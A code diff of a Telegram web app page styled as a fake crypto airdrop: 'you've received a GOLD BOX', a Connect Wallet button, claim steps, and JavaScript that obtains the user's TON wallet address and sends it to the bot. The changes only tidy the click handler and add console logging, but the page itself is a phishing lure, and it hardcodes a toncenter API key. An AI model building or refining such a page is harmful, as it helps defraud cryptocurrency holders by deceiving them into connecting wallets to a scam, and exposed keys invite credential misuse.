@@ -47,6 +47,7 @@
         .wallet-button {
             display: inline-block;
             margin: 10px 0;
+            cursor: pointer;
         }
 
         .wallet-button img {
@@ -166,7 +167,7 @@
         <img src="https://i.postimg.cc/RhY3ZVbM/ball.jpg" alt="Floating Ball" class="floating-image">
         <div class="congratulations">CONGRATULATIONS, YOU'VE RECEIVED A</div>
         <div class="gold-box">GOLD BOX</div>
-        <div class="wallet-button"><img src="https://i.postimg.cc/6pfmqZ77/button.jpg" alt="Connect Wallet" onclick="connectWallet()"></div>
+        <div class="wallet-button" onclick="connectWallet()"><img src="https://i.postimg.cc/6pfmqZ77/button.jpg" alt="Connect Wallet"></div>
         <div class="how-to-claim">HOW TO CLAIM</div>
         <div class="how-to-claim-content">
             <div><span class="list-item">1</span><span class="list-text">To claim rewards, connect your wallet to the AirDrop platform.</span></div>
@@ -193,6 +194,7 @@
     <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.42"></script>
     <script>
         async function connectWallet() {
+            console.log('connectWallet function called');
             const tg = window.Telegram.WebApp;
 
             if (typeof TonWeb === 'undefined') {
@@ -205,9 +207,11 @@
                 const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { apiKey: '8cdc5442c4a006b65eb493dea43a53c4da0fee4ea91fff8ac7cd4d90098c8b89' });
 
                 const wallet = tonweb.wallet.create({ provider });
+                console.log('TonWeb wallet created');
 
                 // Получение адреса кошелька
                 const walletAddress = await getWalletAddress();
+                console.log('Wallet address obtained:', walletAddress);
 
                 tg.sendData(walletAddress);
                 alert('Wallet connected: ' + walletAddress);
